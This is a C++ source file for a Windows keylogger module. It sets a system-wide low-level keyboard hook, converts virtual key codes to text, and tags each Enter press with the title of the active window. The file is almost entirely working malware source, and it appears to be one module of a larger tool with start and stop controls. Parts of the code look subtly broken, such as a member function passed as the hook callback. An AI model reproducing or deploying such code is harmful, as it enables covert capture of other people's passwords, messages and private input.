#include "mod_keylogger.hpp"
#include "misc.hpp"

HHOOK kHook = nullptr;


std::string GetActiveWindow_Title() {
    char buffer[1024];
    std::string strOut = "None";
    if (GetWindowTextA(GetForegroundWindow(), buffer, 1024) > 0) {
        strOut = buffer;
    }
    return strOut;
}

std::string Add_Terminator(const char* cBuffer) {
    char cTmpBuff[20] = "[/";
    int i = 0;
    for (i = 1; i < strlen(cBuffer); i++) {
        cTmpBuff[i + 1] = cBuffer[i];
    }
    return std::string(cTmpBuff);
}

const char* c_KeyMap(int iCode) {
    switch (iCode) {
    case 27:
        return "[ESC]";
        break;
    case 9:
        return "[TAB]\t";
        break;
    case 13:
        return "[ENTER]\n";
        break;
    case 32:
        return " ";
        break;
    case 37:
        return "[LARROW]";
        break;
    case 38:
        return "[UARROW]";
        break;
    case 39:
        return "[RARROW]";
        break;
    case 40:
        return "[DARROW]";
        break;
    case 8:
        return "[DEL]";
        break;
    case 17:
        return "[CTRL]";
        break;
    case 162:
        return "[LCTRL]";
        break;
    case 163:
        return "[RCTRL]";
        break;
    case 16:
        return "[SHIFT]";
        break;
    case 160:
        return "[LSHIFT]";
        break;
    case 161:
        return "[RSHIFT]";
        break;
    case 18:
        return "[MENU]";
        break;
    case 164:
        return "[LMENU]";
        break;
    case 165:
        return "[RMENU]";
        break;
    case 20:
        return "[CAPS]";
        break;
    case 144:
        return "[NLOCK]";
        break;
    case 91:
        return "[LWIN]";
        break;
    case 92:
        return "[RWIN]";
        break;
    case 65:
        return "a";
        break;
    case 66:
        return "b";
        break;
    case 67:
        return "c";
        break;
    case 68:
        return "d";
        break;
    case 69:
        return "e";
        break;
    case 70:
        return "f";
        break;
    case 71:
        return "g";
        break;
    case 72:
        return "h";
        break;
    case 73:
        return "i";
        break;
    case 74:
        return "j";
        break;
    case 75:
        return "k";
        break;
    case 76:
        return "l";
        break;
    case 77:
        return "m";
        break;
    case 78:
        return "n";
        break;
    case 79:
        return "o";
        break;
    case 80:
        return "p";
        break;
    case 81:
        return "q";
        break;
    case 82:
        return "r";
        break;
    case 83:
        return "s";
        break;
    case 84:
        return "t";
        break;
    case 85:
        return "u";
        break;
    case 86:
        return "v";
        break;
    case 87:
        return "w";
        break;
    case 88:
        return "x";
        break;
    case 89:
        return "y";
        break;
    case 90:
        return "z";
        break;
    case 96:
        return "[D0]";
        break;
    case 97:
        return "[D1]";
        break;
    case 98:
        return "[D2]";
        break;
    case 99:
        return "[D3]";
        break;
    case 100:
        return "[D4]";
        break;
    case 101:
        return "[D5]";
        break;
    case 102:
        return "[D6]";
        break;
    case 103:
        return "[D7]";
        break;
    case 104:
        return "[D8]";
        break;
    case 105:
        return "[D9]";
        break;
    case 111:
        return "[D/]";
        break;
    case 106:
        return "[D*]";
        break;
    case 109:
        return "[D-]";
        break;
    case 107:
        return "[D+]";
        break;
    case 110:
        return "[D.]";
        break;
    case 48:
        return "0";
        break;
    case 49:
        return "1";
        break;
    case 50:
        return "2";
        break;
    case 51:
        return "3";
        break;
    case 52:
        return "4";
        break;
    case 53:
        return "5";
        break;
    case 54:
        return "6";
        break;
    case 55:
        return "7";
        break;
    case 56:
        return "8";
        break;
    case 57:
        return "9";
        break;
    case 112:
        return "[F1]";
        break;
    case 113:
        return "[F2]";
        break;
    case 114:
        return "[F3]";
        break;
    case 115:
        return "[F4]";
        break;
    case 116:
        return "[F5]";
        break;
    case 117:
        return "[F6]";
        break;
    case 118:
        return "[F7]";
        break;
    case 119:
        return "[F8]";
        break;
    case 120:
        return "[F9]";
        break;
    case 121:
        return "[F10]";
        break;
    case 122:
        return "[F11]";
        break;
    case 123:
        return "[F12]";
        break;
    case 186:
        return "[;:]";
        break;
    case 187:
        return "[+=]";
        break;
    case 188:
        return "[,]";
        break;
    case 189:
        return "[-_]";
        break;
    case 190:
        return ".";
        break;
    case 191:
        return "[/?]";
        break;
    case 192:
        return "[`~]";
        break;
    case 219:
        return "[[{]";
        break;
    case 220:
        return "[\\|]";
        break;
    case 221:
        return "[]}]";
        break;
    case 222:
        return "['\"]";
        break;
    case 45:
        return "[INS]";
        break;
    case 46:
        return "[SUPR]";
        break;
    case 36:
        return "[HOME]";
        break;
    case 35:
        return "[END]";
        break;
    case 33:
        return "[PGUP]";
        break;
    case 34:
        return "[PGDOWN]";
        break;
    default:
        return "";
        break;
    }
}

LRESULT CALLBACK mod_Keylogger::Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
    if (nCode < 0) {
        return CallNextHookEx(kHook, nCode, wparam, lparam);
    }

    if (!this->isRunning) {
        return 1;
    }
    
    std::string strTempBuffer = "";

    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
        if ((unsigned int)kbs->vkCode == 13) { //ENTER
            strTempBuffer = "\t[[W]";
            strTempBuffer += GetActiveWindow_Title();
            strTempBuffer += "]";
        }
        strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
        std::cout << strTempBuffer << std::endl;
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
            key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT ||
            key == VK_MENU || key == VK_LMENU || key == VK_RMENU ||
            key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN ||
            key == VK_RWIN) {

            strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));

            std::cout << strTempBuffer << std::endl;
        }

    }


    return CallNextHookEx(kHook, nCode, wparam, lparam);
}

mod_Keylogger::mod_Keylogger() {
    return;
}

void mod_Keylogger::Start() {
    DebugPrint("[!] Keylogger start");
	//Keyboard_Proc funcion que captura las teclas
    this->isRunning = true;
	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
}

void mod_Keylogger::Stop() {
    DebugPrint("[!] Keylogger stopping");
    std::unique_lock<std::mutex> lock(this->mtx_Run);
    this->isRunning = false;
    lock.unlock();

    
    DebugPrint("[!] Joining thread");
    if (this->thKey.joinable()) {
        this->thKey.join();
    }

    UnhookWindowsHookEx(kHook);
    kHook = nullptr;

    DebugPrint("[!] Keylogger stopped");
}

void mod_Keylogger::CaptureKeys() {
    kHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)&this->Keyboard_Proc, GetModuleHandle(NULL), 0);

	MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
        std::unique_lock<std::mutex> lock(this->mtx_Run);
        if (!this->isRunning) {
            break;
        }
	}
}


